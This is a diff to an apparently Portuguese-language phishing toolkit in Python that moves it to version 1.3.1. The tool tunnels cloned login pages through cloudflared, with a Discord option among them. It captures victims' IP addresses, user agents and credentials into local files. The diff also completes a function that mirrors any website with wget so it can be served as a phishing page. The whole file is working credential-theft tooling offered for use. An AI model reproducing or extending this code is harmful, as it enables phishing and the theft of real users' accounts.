@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-version = '1.3.0'
+version = '1.3.1'
 
 ###############################
 ## IMPORTAÇÃO DE BIBLIOTECAS ##
@@ -93,16 +93,19 @@ if os.path.exists(cld_log_path):
 PID=['php','cloudflared','loclx']
 for process in PID:
     try:
-        # Obtém os PIDs do processo usando o comando pidof
+        ########################################################
+        ## OBTEM OS PID DOS PROCESSOS PARA LISTAR E ORGANIZAR ##
+        ########################################################
         pids = os.popen(f"pidof {process}").read().strip().split()
         for pid in pids:
             ##############################
-            ## VERIFICA SE TEM CONTEÚDO ##
+            ## VERIFICA SE EXISTE PROCESSOS ##
             ##############################
             if pid: 
                 os.kill(int(pid), 9)
     except Exception as e:
         continue
+
 
 ###################################
 ## VERIFICA SITUAÇAO DA INTERNET ##
@@ -126,6 +129,7 @@ if os.system(f'ping -c 1 -w 5 www.google.com {NULL}') == 0:
 else:
     print('Status da Internet: Offline')
 
+
 ################################
 ## BANNER COM O NOME E VERSÃO ##
 ################################
@@ -140,10 +144,9 @@ def banner():
 8888P   Y8888 888  888 888  888 888 Y8b.     888     
 888P     Y888 888  888 "Y888888 888  "Y8888  888 \033[m
                                              \033[7;34mv{version}\033[m''')
-    
 
 ###############################
-## Instalação do Cloudflared ##
+## INSTALAÇÃO DO CLOUDFLARED ##
 ###############################
 def install_cloudflared():
     if os.path.exists(".server/cloudflared"):
@@ -177,6 +180,7 @@ def install_cloudflared():
         else:
             print(f"Erro ao baixar CloudFlared!")
 
+
 ##################################
 ## FUNÇÃO PARA ALTERAR A PORTA ##
 ##################################
@@ -204,6 +208,7 @@ def alterar_porta():
         PORT = PORTA
         return PORT
     
+
 ##################################
 ## CONFIGURAÇÃO DO SERVIDOR PHP ##
 ##################################
@@ -223,6 +228,7 @@ def capture_ip():
     print('Evento salvo em auth/ips.txt')
     os.system('cat .server/www/ip.txt >> auth/ip.txt')
 
+
 ####################################
 ## FUNÇÃO QUE CAPTURA CREDENCIAIS ##
 ####################################
@@ -234,6 +240,7 @@ def capture_useragent():
         print(f'\033[1;33m{dados}\033[m')
     print('Dados salvos em auth/ips.txt')
     os.system('cat .server/www/useragent.txt >> auth/ip.txt')
+
 
 ####################################
 ## FUNÇÃO QUE CAPTURA CREDENCIAIS ##
@@ -427,12 +434,18 @@ def discord():#15
     website="discord"
     tunnel_menu(website)
 
-
-
-## IMPLEMENTA
+##################################
+## IMPLEMENTA CLONAGEM DE SITES ##
+##################################
 def clonesite():#00
     site = input('Digite o Site a ser clonado (www.***.***): ')
     clone = f'wget --mirror --convert-links --adjust-extension --page-requisites https://{site}'
+    os.system(clone)
+    os.system(f"mv {site} .sites/{site}")
+
+######################
+## SOBRE O SOFTWARE ##
+######################
 def sobre():#99
     banner()
     print('''
@@ -506,7 +519,6 @@ def menu():
 
     except ValueError:
         print('Digite uma opção válida!')
-
 
 
 ####    ##########    ####
